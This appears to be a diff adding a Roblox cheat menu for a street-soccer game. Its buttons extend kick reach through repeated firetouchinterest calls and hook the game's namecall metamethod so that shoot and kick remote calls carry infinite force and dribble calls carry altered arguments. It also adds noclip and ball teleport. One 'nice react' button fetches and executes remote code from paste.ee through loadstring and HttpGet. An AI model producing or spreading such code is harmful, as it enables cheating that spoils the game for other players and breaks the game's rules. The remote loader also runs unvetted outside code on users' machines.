+        -- GO TO: https://rscripts.net/script/TPS--Street-Soccer-Script-or-Reach-2800 --
+        game["RunService"].Stepped:Connect(function()
+            if Leg == "Left" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg"), 1)
+                end
+            end
+            if Leg == "Right" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg"), 1)
+                end
+            end
+            if Leg == "Right" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("Right Leg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Right Leg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Right Leg"), 1)
+                end
+            end
+            if Leg == "Left" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("Left Leg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Left Leg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Left Leg"), 1)
+                end
+            end
+        end)
+    end    
+})
+
+Tab:AddButton({
+	Name = "8 studs left foot",
+	Callback = function()
+        getgenv().Leg = "Left" -- Left or Right
+        getgenv().Reach = 8 -- Change to whatever you want (The game caps it)
+        -- https://rscripts.net/script/TPS--Street-Soccer-Script-or-Reach-2800 -- DO NOT USE THIS SCRIPT BELOW ME, IT WONT WORK--
+        -- GO TO: https://rscripts.net/script/TPS--Street-Soccer-Script-or-Reach-2800 --
+        game["RunService"].Stepped:Connect(function()
+            if Leg == "Left" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg"), 1)
+                end
+            end
+            if Leg == "Right" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg"), 1)
+                end
+            end
+            if Leg == "Right" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("Right Leg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Right Leg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Right Leg"), 1)
+                end
+            end
+            if Leg == "Left" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("Left Leg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Left Leg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Left Leg"), 1)
+                end
+            end
+        end)
+    end    
+})
+
+Tab:AddButton({
+	Name = "15 studs left foot",
+	Callback = function()
+        getgenv().Leg = "Left" -- Left or Right
+        getgenv().Reach = 15 -- Change to whatever you want (The game caps it)
+        -- https://rscripts.net/script/TPS--Street-Soccer-Script-or-Reach-2800 -- DO NOT USE THIS SCRIPT BELOW ME, IT WONT WORK--
+        -- GO TO: https://rscripts.net/script/TPS--Street-Soccer-Script-or-Reach-2800 --
+        game["RunService"].Stepped:Connect(function()
+            if Leg == "Left" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg"), 1)
+                end
+            end
+            if Leg == "Right" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg"), 1)
+                end
+            end
+            if Leg == "Right" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("Right Leg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Right Leg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Right Leg"), 1)
+                end
+            end
+            if Leg == "Left" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("Left Leg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Left Leg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Left Leg"), 1)
+                end
+            end
+        end)
+    end    
+})
+
+Tab:AddButton({
+	Name = "30 studs left foot",
+	Callback = function()
+        getgenv().Leg = "Left" -- Left or Right
+        getgenv().Reach = 30 -- Change to whatever you want (The game caps it)
+        -- https://rscripts.net/script/TPS--Street-Soccer-Script-or-Reach-2800 -- DO NOT USE THIS SCRIPT BELOW ME, IT WONT WORK--
+        -- GO TO: https://rscripts.net/script/TPS--Street-Soccer-Script-or-Reach-2800 --
+        game["RunService"].Stepped:Connect(function()
+            if Leg == "Left" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg"), 1)
+                end
+            end
+            if Leg == "Right" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg"), 1)
+                end
+            end
+            if Leg == "Right" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("Right Leg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Right Leg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Right Leg"), 1)
+                end
+            end
+            if Leg == "Left" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("Left Leg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Left Leg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Left Leg"), 1)
+                end
+            end
+        end)
+    end    
+})
+
+
+--misc
+local Tab = Window:MakeTab({
+	Name = "misc",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+--antiballfling
+Tab:AddButton({
+	Name = "antiballfling",
+	Callback = function()
+        local speaker = game.Players.LocalPlayer
+        local RunService = game:GetService("RunService")
+        Clip = false
+            wait(0.1)
+            local function NoclipLoop()
+                if Clip == false and speaker.Character ~= nil then
+                    for _, child in pairs(speaker.Character:GetDescendants()) do
+                        if child:IsA("BasePart") and child.CanCollide == true and child.Name == "Right Leg" or child.Name == "Right Arm" or child.Name == "Left Arm" or child.Name == "Right Arm" or child.Name == "Torso" then
+                            child.CanCollide = false
+                        end
+                    end
+                end
+            end
+            Noclipping = RunService.Stepped:Connect(NoclipLoop)
+    end    
+})
+
+--fpsbooster
+Tab:AddButton({
+	Name = "fps booster",
+	Callback = function()
+        local decalsyeeted = true -- Leaving this on makes games look shitty but the fps goes up by at least 20.
+        local g = game
+        local w = g.Workspace
+        local l = g.Lighting
+        local t = w.Terrain
+        t.WaterWaveSize = 0
+        t.WaterWaveSpeed = 0
+        t.WaterReflectance = 0
+        t.WaterTransparency = 0
+        l.GlobalShadows = false
+        l.FogEnd = 9e9
+        l.Brightness = 0
+        settings().Rendering.QualityLevel = "Level01"
+        for i, v in pairs(g:GetDescendants()) do
+            if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
+                v.Material = "Plastic"
+                v.Reflectance = 0
+            elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
+                v.Transparency = 1
+            elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
+                v.Lifetime = NumberRange.new(0)
+            elseif v:IsA("Explosion") then
+                v.BlastPressure = 1
+                v.BlastRadius = 1
+            elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") then
+                v.Enabled = false
+            elseif v:IsA("MeshPart") then
+                v.Material = "Plastic"
+                v.Reflectance = 0
+                v.TextureID = 10385902758728957
+            end
+        end
+        for i, e in pairs(l:GetChildren()) do
+            if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
+                e.Enabled = false
+            end
+        end
+    end
+})
+
+
+
+
+--react tab
+local Tab = Window:MakeTab({
+	Name = "react settings",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Tab:AddButton({
+	Name = "nice react",
+	Callback = function()
+        loadstring(game:HttpGet("https://paste.ee/r/q29Pj"))()
+    end    
+})
+
+
+--shoot
+Tab:AddButton({
+	Name = "shoot",
+	Callback = function()
+        _G.Vector = Vector3.new(math.huge, math.huge, math.huge)
+
+        local mt = getrawmetatable(game);
+        local old = mt.namecall
+        setreadonly(mt,false)
+        mt.namecall = newcclosure(function(remote,...)
+           args = {...}
+           method = tostring(getnamecallmethod())
+           if method == "FireServer" and tostring(remote) == "Shoot" then
+               args[6] = _G.Vector
+               return old(remote,unpack(args))
+           end
+           return old(remote,...)
+        end)
+        setreadonly(mt,true)
+  	end    
+})
+
+--kick
+Tab:AddButton({
+	Name = "kick",
+	Callback = function()
+        _G.Vector = Vector3.new(math.huge, math.huge, math.huge)
+
+        local mt = getrawmetatable(game);
+        local old = mt.namecall
+        setreadonly(mt,false)
+        mt.namecall = newcclosure(function(remote,...)
+           args = {...}
+           method = tostring(getnamecallmethod())
+           if method == "FireServer" and tostring(remote) == "Kick" then
+               args[6] = _G.Vector
+               return old(remote,unpack(args))
+           end
+           return old(remote,...)
+        end)
+        setreadonly(mt,true)
+  	end    
+})
+
+--dribble
+Tab:AddButton({
+	Name = "dribble",
+	Callback = function()
+        local player = game:GetService("Players").LocalPlayer
+
+		local mt = getrawmetatable(game);
+		local old = mt.namecall
+		setreadonly(mt,false)
+		mt.namecall = newcclosure(function(remote,...)
+		   args = {...}
+		   method = tostring(getnamecallmethod())
+		   if method == "FireServer" and tostring(remote) == "Dribble" then
+		
+		
+			   args[2] = player.Character.Humanoid.LLCL
+		
+			   return old(remote,unpack(args))
+		end
+		   return old(remote,...)
+		end)
+		setreadonly(mt,true)
+    end    
+})
+
+
+--clickk!
+local Tab = Window:MakeTab({
+	Name = "click!",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+
+Tab:AddButton({
+	Name = "Ball TP",
+	Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").TPSSystem.TPS.CFrame
+    end    
+})
+
+--updates
+local Tab = Window:MakeTab({
+	Name = "updates",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Tab:AddParagraph("19.02.2023","Maked from me")
+Tab:AddParagraph("25.02.2023","Added react")
+
+
+--onlyAdmin
+local Tab = Window:MakeTab({
+	Name = "onlyAdmin",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+
+OrionLib:MakeNotification({
+	Name = "tysm",
+	Content = "yBloodz Tps Script",
+	Image = "rbxassetid://4483345998",
+	Time = 5
+})
